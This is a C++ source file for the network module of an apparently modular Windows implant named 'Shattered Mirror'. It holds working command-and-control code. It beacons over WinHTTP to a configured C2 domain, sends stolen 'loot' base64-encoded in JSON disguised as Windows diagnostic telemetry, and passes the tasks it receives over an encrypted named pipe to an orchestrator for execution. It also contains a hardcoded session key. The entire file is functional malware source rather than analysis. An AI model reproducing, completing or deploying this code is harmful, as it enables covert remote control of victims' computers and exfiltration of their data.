/*=============================================================================
 * Shattered Mirror v1 — Atom 01: Network Communicator
 *
 * Implements WinHTTP beaconing masked as JSON telemetry. 
 * Connects to Orchestrator via IPC to receive Loot/Commands.
 * Uses dynamic configuration and detailed logging.
 *===========================================================================*/

#include "Atom_01_Net.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <string>
#include <cstdio>
#include <ctime>

#pragma comment(lib, "winhttp.lib")

/* Helper to convert simple strings for JSON (Base64 Encode) */
static void Base64Encode(const BYTE* pBuf, DWORD dwLen, char* szOut) {
    if (!pBuf || !szOut) return;
    static const char cb64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    int i, j;
    for (i = 0, j = 0; i < (int)dwLen; i += 3) {
        int v = pBuf[i];
        v = (v << 8) | (i + 1 < (int)dwLen ? pBuf[i + 1] : 0);
        v = (v << 8) | (i + 2 < (int)dwLen ? pBuf[i + 2] : 0);

        szOut[j++] = cb64[(v >> 18) & 0x3F];
        szOut[j++] = cb64[(v >> 12) & 0x3F];
        if (i + 1 < (int)dwLen) szOut[j++] = cb64[(v >> 6) & 0x3F]; else szOut[j++] = '=';
        if (i + 2 < (int)dwLen) szOut[j++] = cb64[v & 0x3F]; else szOut[j++] = '=';
    }
    szOut[j] = '\0';
}

/*---------------------------------------------------------------------------
 *  ExfiltrateTelemetry
 *  Disguises payload in a JSON body (mimicking Windows diagnostic data)
 *-------------------------------------------------------------------------*/
BOOL TransmitPulse(const BYTE* pOptionalLoot, DWORD dwLength, char* szTaskOut, DWORD dwMaxTask) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return FALSE;

    WCHAR wDomain[256] = { 0 };
    MultiByteToWideChar(CP_ACP, 0, Config::C2_DOMAIN, -1, wDomain, 256);
    HINTERNET hConnect = WinHttpConnect(hSession, wDomain, (INTERNET_PORT)Config::C2_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return FALSE; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v2/telemetry", NULL, NULL, NULL, (Config::C2_PORT == 443 ? WINHTTP_FLAG_SECURE : 0));
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return FALSE; }

    std::wstring headers = L"Content-Type: application/json\r\nX-Telemetry-ID: " + std::wstring(Config::PSK_ID, Config::PSK_ID + strlen(Config::PSK_ID)) + L"\r\n";
    WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);

    char szJsonBody[8192] = "{ \"report_id\": \"hb_pulse\", \"diagnostic_blob\": \"dummy\" }";
    if (pOptionalLoot && dwLength > 0) {
        char* szB64 = (char*)malloc(((dwLength + 2) / 3) * 4 + 1);
        if (szB64) {
            Base64Encode(pOptionalLoot, dwLength, szB64);
            snprintf(szJsonBody, sizeof(szJsonBody), "{\"report_id\":\"user_crash_01\",\"diagnostic_blob\":\"%s\"}", szB64);
            free(szB64);
        }
    }

    if (WinHttpSendRequest(hRequest, NULL, 0, (LPVOID)szJsonBody, (DWORD)strlen(szJsonBody), (DWORD)strlen(szJsonBody), 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD dwSize = 0;
            if (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0) {
                if (dwSize < dwMaxTask) {
                    WinHttpReadData(hRequest, (LPVOID)szTaskOut, dwSize, &dwSize);
                    szTaskOut[dwSize] = '\0';
                }
            }
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return TRUE;
}

/*---------------------------------------------------------------------------
 *  NetworkAtomMain
 *-------------------------------------------------------------------------*/
DWORD WINAPI NetworkAtomMain(LPVOID lpParam) {
    PNET_CONFIG pConfig = (PNET_CONFIG)lpParam;
    if (!pConfig) return 1;

    HANDLE hPipe = IPC_ConnectToPipe(pConfig->dwAtomId);
    if (!hPipe) return 1;

    BYTE SharedSessionKey[] = "YiZZCxy3SLMsIdhN";

    while (TRUE) {
        char szTaskBuffer[2048] = { 0 };
        TransmitPulse(NULL, 0, szTaskBuffer, 2048);

        if (strlen(szTaskBuffer) > 0 && strstr(szTaskBuffer, "\"atom_id\"")) {
            char* pAtom = strstr(szTaskBuffer, "\"atom_id\"");
            char* pPayload = strstr(szTaskBuffer, "\"payload\"");

            if (pAtom && pPayload) {
                char* pAtomColon = strchr(pAtom, ':');
                char* pPayloadColon = strchr(pPayload, ':');

                if (pAtomColon && pPayloadColon) {
                    int atom_id = atoi(pAtomColon + 1);
                    
                    // Locate the exact payload string wrapped in quotes
                    char* pPayloadStart = strchr(pPayloadColon, '"');
                    if (pPayloadStart) {
                        pPayloadStart++; // Step past the opening quote
                        char* pPayloadEnd = strchr(pPayloadStart, '"');
                        
                        if (pPayloadEnd) {
                            DWORD dwLen = (DWORD)(pPayloadEnd - pPayloadStart);
                            IPC_MESSAGE taskMsg = { 0 };
                            
                            // [!] CRITICAL FIX: The Orchestrator drops messages without the SMIR signature!
                            taskMsg.dwSignature = 0x534D4952; 
                            taskMsg.CommandId = CMD_EXECUTE;
                            taskMsg.AtomId = (DWORD)atom_id;
                            
                            // Bounds checking so we don't buffer overflow our own IPC pipe
                            if (dwLen > MAX_IPC_PAYLOAD_SIZE - 1) {
                                dwLen = MAX_IPC_PAYLOAD_SIZE - 1;
                            }
                            
                            memcpy(taskMsg.Payload, pPayloadStart, dwLen);
                            taskMsg.Payload[dwLen] = '\0';
                            taskMsg.dwPayloadLen = dwLen;

                            IPC_SendMessage(hPipe, &taskMsg, SharedSessionKey, 16);
                        }
                    }
                }
            }
        }

        DWORD dwWait = 2000; // Cranking the speed for real-time shell feeling
        DWORD dwSlept = 0;
        while (dwSlept < dwWait) {
            DWORD dwAvail = 0;
            if (PeekNamedPipe(hPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
                IPC_MESSAGE inMsg = { 0 };
                if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
                    if (inMsg.CommandId == CMD_REPORT) {
                        TransmitPulse(inMsg.Payload, inMsg.dwPayloadLen, szTaskBuffer, 2048);
                    }
                }
            }
            Sleep(200); dwSlept += 200;
        }
    }

    return 0;
}
